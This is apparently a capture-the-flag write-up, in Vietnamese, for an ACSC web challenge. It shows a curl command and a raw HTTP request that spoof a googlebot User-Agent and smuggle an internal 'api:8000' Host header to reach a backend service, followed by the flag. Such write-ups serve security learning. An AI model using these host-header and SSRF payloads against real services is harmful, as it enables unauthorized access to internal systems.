# Favorite emoji

![](../.gitbook/assets/image%20%2829%29.png)

Có thể flag nằm trong này 

![](../.gitbook/assets/image%20%2828%29.png)

Để lấy được flag ta set prerender = 1

=&gt; user\_agent = googlebot ...

![](../.gitbook/assets/image%20%2831%29.png)

![](../.gitbook/assets/image%20%2830%29.png)

host : api:8000

```text
payload1=curl -H "User-Agent: googlebot" http://favorite-emojis.chal.acsc.asia:5000 -H "Host: api：8000"
```

```text
payload2:

GET / HTTP/1.1
Host:api%3A8000%3F@host
Upgrade-Insecure-Requests: 1
User-Agent:googlebot
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

api%3A8000%3F@host
```

Flag : ACSC{sharks\_are\_always\_hungry}

